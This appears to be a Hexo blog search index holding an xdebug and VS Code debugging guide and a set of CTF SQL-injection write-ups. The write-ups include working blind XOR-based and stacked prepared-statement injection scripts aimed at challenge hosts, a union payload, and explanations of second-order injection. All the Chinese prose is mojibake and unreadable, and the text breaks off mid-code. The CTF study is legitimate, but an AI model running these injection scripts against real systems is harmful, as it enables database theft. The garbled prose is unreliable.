<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ä½¿ç”¨vscodeå’Œxdebugå®ç°è¿œç¨‹è°ƒè¯•è™šæ‹Ÿæœºä¸­çš„phpé¡¹ç›®</title>
    <url>/2019/12/16/vscode-vmware-xdebug/</url>
    <content><![CDATA[<blockquote>
<p><s>ä¸ºäº†é¿å¼€windowsä¸‹debugæ—¶å€™å¯èƒ½å‡ºç°çš„æ€ªå¼‚é—®é¢˜, æˆ‘èŠ±äº†ä¸€ä¸ªæ™šä¸Šæ­å»ºäº†xdebug+vscodeçš„è¿œç¨‹è°ƒè¯•ç¯å¢ƒ, ç‰¹æ­¤è®°å½•</s></p>
<p>vscodeçš„phpè°ƒè¯•æ’ä»¶æœ‰å‘, è¿˜æ˜¯ç”¨phpstormå§</p>
</blockquote>
<h2 id="requirement">requirement</h2>
<ul>
<li>client
<ul>
<li>vscode</li>
<li>vscode plugin: php debug</li>
<li>firefox(chrome) xdebug plugin</li>
</ul>
</li>
<li>Server
<ul>
<li>xdebug</li>
</ul>
</li>
</ul>
<h2 id="Installation">Installation</h2>
<h3 id="xdebug">xdebug</h3>
<p>åœ¨kaliä¸Š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install php-pear</span><br><span class="line">apt install php-dev</span><br><span class="line">pecl install xdebug</span><br></pre></td></tr></table></figure>
<p>åœ¨/etc/php/7.3/apache2/php.iniä¸­æ·»åŠ </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=/usr/lib/php/20180731/xdebug.so</span><br><span class="line">xdebug.remote_enable = true</span><br><span class="line">xdebug.remote_autostart = true</span><br><span class="line">xdebug.remote_host = 192.168.75.1</span><br><span class="line">xdebug.remote_port = 9000</span><br><span class="line">xdebug.remote_log = /var/log/xdebug.log</span><br><span class="line">xdebug.max_nesting_level = 1000</span><br></pre></td></tr></table></figure>
<p>remote_hostå¡«å†™ä¸»æœºurl, ç„¶å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service apache2 restart</span><br></pre></td></tr></table></figure>
<p>ç„¶åé€šè¿‡phpinfoæ¥æ£€æŸ¥xdebugæ˜¯å¦å·²ç»å¯ç”¨</p>
<h3 id="vscode">vscode</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctrl+alt+p æ‰“å¼€launch.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    // Use IntelliSense to learn about possible attributes.</span><br><span class="line">    // Hover to view descriptions of existing attributes.</span><br><span class="line">    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Listen for XDebug&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;pathMappings&quot;: &#123;</span><br><span class="line">                &quot;/var/www/html/cms/tp6x&quot;: &quot;C:\\Users\\ch4ser__\\Desktop\\vscode_workspace\\tp6x&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;port&quot;: 9000,</span><br><span class="line">            &quot;log&quot;: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;Launch currently open script&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;php&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,</span><br><span class="line">            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,</span><br><span class="line">            &quot;port&quot;: 9000</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>pathmapping ä¸­, æœåŠ¡å™¨çš„webé¡¹ç›®è·¯å¾„å’Œæœ¬åœ°ä¸»æœºçš„webé¡¹ç›®è·¯å¾„è¦ä¸€è‡´.</p>
<p>è¿™æ ·å°±å¯ä»¥äº†</p>
<h2 id="ä½¿ç”¨">ä½¿ç”¨</h2>
<p>ä¸¤ä¸ªè·¯å¾„ä¸‹éƒ½æ˜¯ä¸€æ ·çš„ä»£ç , åœ¨vscodeä¸­ä¸‹æ–­ç‚¹, å¯åŠ¨Listen for XDebugæ¨¡å¼, æµè§ˆå™¨æ’ä»¶å¯åŠ¨xdebugæ¨¡å¼ å¹¶è®¿é—®æœåŠ¡å™¨çš„webè·¯å¾„, è¿™ä¸ªæ—¶å€™vscodeå°±åˆ°äº†æ–­ç‚¹å¤„</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70918588-42516f00-205a-11ea-8d71-7da8fce60950.png" alt="image"></p>
]]></content>
  </entry>
  <entry>
    <title>SQL é¢˜å‹è®°å½•[working forever]</title>
    <url>/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-Final-SQL">æå®¢å¤§æŒ‘æˆ˜ Final SQL</h2>
<p>è¿‡æ»¤äº†å¾ˆå¤š, ç„¶ååœ¨idå¤„æµ‹å‡ºäº†å¼‚æˆ–æ³¨å…¥.</p>
<p>è¿‡æ»¤äº†ç©ºæ ¼å’Œæ˜Ÿå·, ç”¨æ‹¬å·ç»•è¿‡, ç„¶åæ³¨, è¯»flagè¡¨:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71089636-42797800-21dc-11ea-817e-afef75383bf4.png" alt="image"></p>
<p>æ€ä¹ˆè¿™ä¹ˆå¤šåƒåœ¾æ•°æ®? å€’è¿‡æ¥è¯»ä¸€ä¸‹çœ‹å§</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71090399-e879b200-21dd-11ea-86f4-fe14182456c1.png" alt="image"></p>
<p>ğŸ‘´å“­äº†</p>
<p>å»è¯»å¦ä¸€å¼ è¡¨äº†, è¿™æ¬¡è¿˜æ˜¯ä»æœ€åä¸€ä½å¾€å‰è¯»</p>
<p><img src="https://user-images.githubusercontent.com/40637063/71090386-de57b380-21dd-11ea-8bcb-220f4ffbaf93.png" alt="image"></p>
<p>è„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database()))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="comment">#  url = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('Flaaaaag'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">-1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) // <span class="number">2</span></span><br><span class="line">        <span class="comment">#  url_tmp = "http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp('F1naI1y'))),&#123;0&#125;,1))&gt;(&#123;1&#125;)))".format(index, m_bound)</span></span><br><span class="line">        url_tmp = <span class="string">"http://a8d97c6c-30fd-411e-9c6e-4ab81b294cd3.node3.buuoj.cn/search.php?id=6^(select(ord(substr((select(group_concat(password))from(F1naI1y)),&#123;0&#125;,1))&gt;(&#123;1&#125;)))"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  url_tmp = url.format(index, m_bound)</span></span><br><span class="line">        res = requests.get(url_tmp).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'ERROR'</span> <span class="keyword">in</span> res:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">    result = chr(tmp) + result</span><br><span class="line">    print(result)</span><br><span class="line">    index -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  for i in range(1, 20):</span></span><br><span class="line">    <span class="comment">#  for j in range(32, 128):</span></span><br><span class="line">        <span class="comment">#  url_tmp = url.format(i, j)</span></span><br><span class="line">        <span class="comment">#  #  print(url_tmp)</span></span><br><span class="line">        <span class="comment">#  res = requests.get(url_tmp).content</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#  if 'ERROR' in res:</span></span><br><span class="line">            <span class="comment">#  result += chr(j)</span></span><br><span class="line">            <span class="comment">#  print(result)</span></span><br><span class="line">            <span class="comment">#  break</span></span><br></pre></td></tr></table></figure>
<h2 id="XDCTF-2015-filemanager">XDCTF  2015 filemanager</h2>
<p>æä¾›äº†æ–‡ä»¶ä¸Šä¼ , åˆ é™¤å’Œæ”¹åçš„åŠŸèƒ½, æœ‰æºç æ³„éœ², åˆ é™¤åŠŸèƒ½æ²¡ä»€ä¹ˆç”¨, å…¶ä»–å…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// common.inc.php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>($_GET, $_POST, $_COOKIE) <span class="keyword">as</span> $global_var) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		is_string($value) &amp;&amp; $req[$key] = addslashes($value);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// upload.php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES) &#123;</span><br><span class="line">	$file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">	<span class="keyword">if</span> ($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">		$name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">		$path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		$name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// $path_parts["filename"] = $db-&gt;quote($path_parts["filename"]);</span></span><br><span class="line">		<span class="comment">// Fix</span></span><br><span class="line">		$path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">		$sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line"></span><br><span class="line">		$fetch = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($fetch-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (move_uploaded_file($file[<span class="string">"tmp_name"</span>], UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">			$sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">			$re = $db-&gt;query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">				print_r($db-&gt;error);</span><br><span class="line">				<span class="keyword">exit</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		print_r(error_get_last());</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rename.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">	$result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		$result = $result-&gt;fetch_assoc();</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($result) &#123;</span><br><span class="line"></span><br><span class="line">		$req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">		$re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">		<span class="keyword">if</span> (!$re) &#123;</span><br><span class="line">			print_r($db-&gt;error);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$oldname = UPLOAD_DIR . $result[<span class="string">"filename"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		$newname = UPLOAD_DIR . $req[<span class="string">"newname"</span>] . $result[<span class="string">"extension"</span>];</span><br><span class="line">		<span class="keyword">if</span> (file_exists($oldname)) &#123;</span><br><span class="line">			rename($oldname, $newname);</span><br><span class="line">		&#125;</span><br><span class="line">		$url = <span class="string">"/"</span> . $newname;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™éƒ½ç»è¿‡äº†addslash, æ”¹åå­—é˜¶æ®µä»æ•°æ®åº“ä¸­å–å‡ºåŸæœ¬çš„æ•°æ®ä¸ç»è¿‡addslashesåç›´æ¥æ‹¼è¿›äº†æŸ¥è¯¢è¯­å¥ä¸­, å¯¼è‡´äºŒæ¬¡æ³¨å…¥.</p>
<p>æ”¹åæ“ä½œæ˜¯æ–°æ–‡ä»¶åå’ŒåŸæ–‡ä»¶æ‰©å±•åæ‹¼æ¥, å¯ä»¥åœ¨äºŒæ¬¡æ³¨å…¥çš„æ—¶å€™å°†åŸæ–‡ä»¶æ‰©å±•åç½®ç©º, è¿™æ ·æ•°æ®åº“ä¸­äºŒæ¬¡æ³¨å…¥å®Œä¹‹åå°±filename=x.jpg, extension=â€™â€™, è¿™æ ·å°±å¯ä»¥ç›´æ¥ä¸Šä¼ x.jpgåæ”¹åæˆphpäº†.</p>
<h2 id="facebook-ctf-2019-product-manager">facebook ctf 2019 product manager</h2>
<p>buuä¸Šçš„è¿™é¢˜æœ‰ç‚¹é—®é¢˜, æ²¡æœ‰flag. æ‰€ä»¥è‡ªå·±èµ·äº†ä¸€ä¸ªç„¶åå¤ç°, ä¸»ç•Œé¢å¦‚ä¸‹</p>
<p><img src="C:%5CUsers%5Cch4ser__%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191216152057800.png" alt="image-20191216152057800"></p>
<p>å…³é”®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE products (</span></span><br><span class="line"><span class="comment">  name char(64),</span></span><br><span class="line"><span class="comment">  secret char(64),</span></span><br><span class="line"><span class="comment">  description varchar(250)</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE');</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('messenger', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('instagram', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('whatsapp', sha256(....), ....);</span></span><br><span class="line"><span class="comment">INSERT INTO products VALUES('oculus-rift', sha256(....), ....);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    ...... </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"s"</span>, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flagåœ¨facebooké¡¹ä¸­, åŒæ—¶, ä»£ç é€»è¾‘ä¸å…è®¸æ’å…¥åŒåé¡¹, ä½†æ˜¯get_productä»…ä»…ä»åå­—æ¥é€‰æ‹©é¡¹, ä½†æ˜¯select çš„ç‰¹æ€§æ˜¯å¿½ç•¥æœ«å°¾çš„ç©ºæ ¼, å¦‚æœæ’å…¥ä¸€æ¡åå­—å«åš<code>facebook      {å‡ ä¸ªç©ºæ ¼}</code>çš„é¡¹ç›®çš„è¯, åœ¨æŸ¥è¯¢<code>Facebook</code>, å¹¶ä¸”ç”¨facebook{ç©ºæ ¼}æ’å…¥æ—¶å€™çš„å¯†ç æ¥éªŒè¯çš„è¯æ˜¯å¯ä»¥éªŒè¯é€šè¿‡çš„,  ç»“æœå°±ä¼šæŸ¥è¯¢å‡ºä¸¤ä¸ª, ä¸€ä¸ªæ˜¯çœŸæ­£çš„facebookå¦ä¸€ä¸ªæ˜¯æˆ‘ä»¬æ’å…¥çš„</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70886814-6344a080-2017-11ea-8a04-415a612ee2ab.png" alt="image"></p>
<p>æŸ¥è¯¢facebook, å¯†ç æ˜¯ä¸€å¼€å§‹çš„å¯†ç </p>
<p><img src="https://user-images.githubusercontent.com/40637063/70886862-82433280-2017-11ea-955d-98e9eccec93b.png" alt="image"></p>
<h2 id="swpuctf-2019-web1">swpuctf 2019 web1</h2>
<p>è¿™é¢˜è€ƒå¯ŸäºŒæ¬¡æ³¨å…¥,  é¢˜ç›®é‡Œé¢æ˜¯ä¸€ä¸ªå¹¿å‘Šå‘å¸ƒé¡µé¢, ç‚¹å‡»ç”³è¯·å¹¿å‘Šåæ·»åŠ æ ‡é¢˜ç­‰å¹¿å‘Šä¿¡æ¯ä¹‹åå›åˆ°é¦–é¡µç‚¹å‡»å¹¿å‘Šè¯¦æƒ…å°±èƒ½è§¦å‘äºŒæ¬¡æ³¨å…¥æ¼æ´, ä¸€å¼€å§‹ç”³è¯·å¹¿å‘Šçš„æ—¶å€™åº”è¯¥æ˜¯è½¬ä¹‰ä¹‹åçš„å­—ç¬¦ä¸²è¢«åŠ å…¥æ•°æ®åº“ä¸­, ç¬¬äºŒæ¬¡ç»™æˆ‘çš„æ„Ÿè§‰æ˜¯é€šè¿‡idæ¥æŸ¥è¯¢å‡ºtitleç„¶åç”¨æ²¡æœ‰addslashè¿‡çš„titleåˆå»æ‰§è¡Œäº†å…¶ä»–sqlè¯­å¥, æˆ–è®¸æ˜¯æŸ¥è¯¢contentå’Œac? æ„Ÿè§‰æ€ªæ€ªçš„.æ€»ä¹‹payloadå¦‚ä¸‹(22åˆ—çœŸçš„ç‹ ).</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70391534-502b4280-1a11-11ea-9761-3c0c2754fb47.png" alt="image"></p>
<p>å…¶å®æ­£è§£æ˜¯é€šè¿‡sys.schema_index_statisticsæ‰¾åˆ°table_name, ç„¶åæ— åˆ—åæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">title=hhhh&apos;/**/union/**/select/**/1,(select/**/group_concat(q)/**/from/**/(select/**/ 1,2,3&apos;q&apos;/**/union/**/select/**/*/**/from/**/users)m),&apos;222&apos;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22||&apos;&amp;content=hello&amp;ac=add</span><br></pre></td></tr></table></figure>
<h2 id="swpuctf-2019-web4">swpuctf 2019 web4</h2>
<p>è€ƒå¯Ÿå †å æ³¨å…¥,å¼€å±€ç™»å½•ç•Œé¢, è®©usernameç­‰äºå•å¼•å·500, è®©usernameç­‰äº<code>and'</code> 200, æ¢æˆ<code>an'</code> åˆæ˜¯500, å¯è§è¿™ä¸ªå›æ˜¾ä¸æ­£å¸¸, å¾ˆæœ‰å¯èƒ½æ˜¯andè¢«è¿‡æ»¤äº†, å†æµ‹è¯•ä¸€ä¸‹å…¶ä»–çš„å…³é”®å­—çš„ç¡®è¢«è¿‡æ»¤äº†å¾ˆå¤šåŒ…æ‹¬select å’Œconcat, é‡‡ç”¨é¢„ç¼–è¯‘å †å æ³¨å…¥ , è„šæœ¬å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="comment">#  select case when 1=0 then (exp(~(select 1))) else 1 end;</span></span><br><span class="line"><span class="comment">#  ';set/**/@a=0x73656c6563742063617365207768656e20313d31207468656e2028657870287e2873656c656374203129292920656c7365203120656e643b;prepare/**/kk/**/from/**/@a;execute/**/kk;</span></span><br><span class="line">a = <span class="string">"select case when 1=0 then (exp(~(select 1))) else 1 end;"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(query)</span>:</span></span><br><span class="line">    hex_str = hex(bytes_to_long(query))[:<span class="number">-1</span>]</span><br><span class="line">    stack = <span class="string">"""';set/**/@a=&#123;0&#125;;prepare/**/kk/**/from/**/@a;execute/**/kk;"""</span>.format(hex_str)</span><br><span class="line">    <span class="keyword">return</span> stack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(stack)</span>:</span></span><br><span class="line">    json_str = &#123;</span><br><span class="line">        <span class="string">"username"</span>:stack,</span><br><span class="line">        <span class="string">"password"</span>:<span class="string">"gg"</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">    url = <span class="string">"http://182.92.220.157:11116/index.php?r=Login/Login"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=json.dumps(json_str), headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment">#  print res.content</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l_bound = <span class="number">0</span>;h_bound = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> l_bound&lt;=h_bound:</span><br><span class="line">        m_bound = (l_bound + h_bound) / <span class="number">2</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/version()),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        query = <span class="string">"select case when ord(substr((select/**/group_concat(flag)/**/from/**/flag),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;"</span>.format(index, m_bound)</span><br><span class="line">        <span class="comment">#  query = "select case when ord(substr((select 'hello'),&#123;0&#125;,1))&gt;&#123;1&#125; then (exp(~(select 1))) else 1 end;".format(index, m_bound)</span></span><br><span class="line">        <span class="comment">#  print query</span></span><br><span class="line">        stack = generate(query)</span><br><span class="line">        a = send(stack)</span><br><span class="line">        <span class="comment">#  exit(0)</span></span><br><span class="line">        <span class="keyword">if</span> a:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h_bound = m_bound - <span class="number">1</span></span><br><span class="line">            temp = m_bound</span><br><span class="line"></span><br><span class="line">    result += chr(temp)</span><br><span class="line">    index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
<p>æ³¨å…¥å‡ºæ¥ä¸€ä¸ªzipçš„è·¯å¾„, è·å–å®ƒä¹‹åå¼€å§‹å®¡è®¡ä»£ç , å‘ç°extractå‡½æ•°å¤„æœ‰å˜é‡è¦†ç›–æ¼æ´</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70391962-95517380-1a15-11ea-8b9f-7e1d76a23770.png" alt="image"></p>
<p>å‡ºæ¥çš„base64è¿›è¡Œä¸€ä¸ªè§£ç å°±æœ‰flagäº†</p>
<h2 id="Comment">Comment</h2>
<p>ä½¿ç”¨è¿™ä¸ªå·¥å…·https://github.com/gakki429/Git_Extract å°†è¿œç¨‹ç¯å¢ƒä¸­çš„.gitä¸­çš„å¯¹è±¡è¿˜åŸå‡ºæ¥, æ™®é€šçš„githackåšä¸åˆ°è¿™ä¸€ç‚¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span 